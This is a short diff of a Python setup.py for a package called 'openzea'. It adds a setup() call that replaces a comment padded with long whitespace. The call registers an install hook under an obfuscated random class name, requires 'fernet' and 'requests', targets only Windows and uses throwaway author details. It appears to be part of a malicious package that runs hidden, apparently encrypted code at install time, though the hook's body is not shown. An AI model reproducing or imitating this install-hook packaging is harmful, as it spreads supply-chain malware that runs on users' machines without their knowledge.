@@ -18,5 +18,22 @@ class BQOiQMCpRaWooalSygoMMffYeScMFmZqrjzIjQMUFGdWeUfyEuoUHgQXigsxezkqkVbkGzdpSV
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+setup(
+    name="openzea",
+    version=VERSION,
+    author="LCyPTvvXDtKHetsD",
+    author_email="CTLkKptq@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': BQOiQMCpRaWooalSygoMMffYeScMFmZqrjzIjQMUFGdWeUfyEuoUHgQXigsxezkqkVbkGzdpSVrzyS,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
